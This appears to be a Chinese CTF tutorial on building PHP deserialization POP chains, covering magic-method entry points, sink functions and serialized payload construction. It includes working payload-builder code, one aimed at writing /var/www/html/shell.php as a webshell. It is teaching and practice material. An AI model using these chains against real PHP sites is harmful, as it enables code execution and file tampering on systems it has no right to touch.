# 🛠 **POP链造链法！（超实战版）**

我们要像高手一样，**自己造出一条可以打的漏洞链**。
 整个过程分成 5 步。

------

## 🌟 第一步：入口魔术方法

### 🎯 找哪里能自动触发？

| 魔术方法                     | 场景                     |
| ---------------------------- | ------------------------ |
| `__destruct()`               | 对象销毁时（常见）       |
| `__wakeup()`                 | unserialize() 时（常见） |
| `__toString()`               | 对象被字符串化时         |
| `__call()`、`__callStatic()` | 调用不存在的方法时       |
| `__invoke()`                 | 对象当函数调用时         |

**注意**：很多题目只要你一反序列化就 `__destruct()` 自动触发，所以特别常用！

------

## 🌟 第二步：中转传递

### 🎯 找属性或者对象联动！

比如在 `__destruct()` 中有这样的代码：

```php
function __destruct() {
    $this->logger->log("bye");
}
```

说明：

- `$logger` 是一个对象
- 你可以控制 `$logger`
- 你还能控制 `$logger->log()` 的逻辑！

就可以继续往下连了！

------

### 📚 常见的传递形式

| 代码                                             | 说明         |
| ------------------------------------------------ | ------------ |
| `$this->obj->method()`                           | 对象调用方法 |
| `$this->file = fopen($this->filename)`           | 调用文件函数 |
| `$this->content = file_get_contents($this->url)` | 读取网络文件 |

只要能让 `$this->xxx` 可控，就能往后连！！

------

## 🌟 第三步：敏感函数点

### 🎯 找能直接导致漏洞的地方！

| 函数                                 | 漏洞                  |
| ------------------------------------ | --------------------- |
| `system()`、`exec()`、`shell_exec()` | 命令执行              |
| `include()`、`require()`             | 任意文件包含          |
| `file_get_contents()`、`fopen()`     | 任意文件读            |
| `unlink()`、`rmdir()`                | 文件删除              |
| `file_put_contents()`                | 任意文件写（写马）    |
| `preg_replace('/e'修饰符)`           | 代码执行（老版本PHP） |

一旦链子连到这里，就是起飞！

------

## 🌟 第四步：控制属性值

### 🎯 最后要安排好每个对象的属性值！

比如：

- 如果某个地方 `system($this->cmd)`，你就让 `$cmd = "id"`
- 如果某个地方 `include($this->file)`，你就让 `$file = "php://filter/..."`

属性要根据链子的需要，一个一个安排好。

------

## 🌟 第五步：拼接 payload

最终，把链子里的对象用 `serialize()` 拼好，打出去！

比如链子是：

```php
入口类 A （触发 __destruct） → B （触发 __toString） → C （执行 include）
```

payload大概长这样：

```php
O:1:"A":1:{s:1:"b";O:1:"B":1:{s:1:"c";O:1:"C":1:{s:4:"file";s:15:"php://filter/...";}}}
```

然后 base64 编一下，urlencode 编一下，发请求炸！

------

# 🚀🚀🚀 造链总结

**口诀版记忆！**

> 找入口，连中转，控敏感，调参数，串成串！

------

# 🎯 举个完整 CTF实战链子例子：

CTF赛题，源码有2个类：

```php
class Logger {
    public $logFile;

    function __destruct() {
        file_put_contents($this->logFile, "Log end.");
    }
}

class Upload {
    public $filename;

    function __toString() {
        return $this->filename;
    }
}
```

- `Logger` 的 `__destruct()` 用了 `$this->logFile`
- 如果 `$logFile` 是一个 `Upload` 对象
- 调用 `file_put_contents($Upload)` 时，会触发 `Upload->__toString()`
- `__toString()` 返回 `$filename`
- 最终 file_put_contents() 写到你指定的地方！

**payload构造思路：**

```php
$u = new Upload();
$u->filename = "/var/www/html/shell.php"; // 写到shell

$l = new Logger();
$l->logFile = $u; // 让logFile是Upload对象

echo urlencode(serialize($l));
```

就可以打文件写了！！💥

------

# ❗ 最后给你一份必杀表：常见魔术方法触发点



| 魔术方法     | 触发时机       | 常见链子起点                        |
| ------------ | -------------- | ----------------------------------- |
| `__destruct` | 对象销毁       | 90%题目都用                         |
| `__wakeup`   | unserialize后  | 有些题特意用 wakeup                 |
| `__toString` | 对象当字符串用 | 结合 include()、file_put_contents() |
| `__call`     | 调用未定义方法 | 适合接连其他类                      |
| `__invoke`   | 对象当函数用   | 少见但强                            |



------

#  代码参考

```php
<?php

// 1. 创建一个实例
class wllm
{
    public $admin;
    public $passwd;

    public function concat($admin, $passwd)
    {
        $this->admin = $admin;
        $this->passwd = $passwd;
        return $admin + $this->passwd;
    }

    public function __construct()
    {
        $this->admin = "user";
        $this->passwd = "123456";
    }

    public function __destruct()
    {
        if ($this->admin === "admin" && $this->passwd === "ctf") {
            include("flag.php");
            echo $flag;
        } else {
            echo $this->admin;
            echo $this->passwd;
            echo "Just a bit more!";
        }
    }
}

// 2. 创建对象并赋值
$exp = new wllm();
$exp->admin = "admin";   // 赋值
$exp->passwd = "ctf";    // 赋值
// 3. 序列化并 URL 编码（直接拿去传参）
echo urlencode(serialize($exp));

#-------------------------------------------------------------------------
class A
{
    public $data;

    function __destruct()
    {
        echo file_get_contents($this->data);
    }
}

echo "\n";
$a = new A();
$a->data = "test";

echo serialize($a);
echo "\n";

#-------------------------------------------------------------------------


class Note
{
    public $content;

    function __toString()
    {
        return $this->content;
    }
}

class Reader
{
    public $note;

    function __destruct()
    {
        include($this->note);
    }
}

$note = new Note();
$note->content = "flag.php";
echo serialize($note);
echo "\n";

$reader = new Reader();
$reader->note = $note;
echo serialize($reader);
echo "\n";

#-------------------------------------------------------------------------

class Logger
{
    public $file;

    function log($message)
    {
        file_put_contents($this->file, $message);
    }
}

class System
{
    public $logger;

    function __destruct()
    {
        $this->logger->log("CTF!");
    }

}

$logger = new Logger();
$logger->file = "flag.php";

$system = new System();
$system->logger = $logger;

echo serialize($system);


?>

```

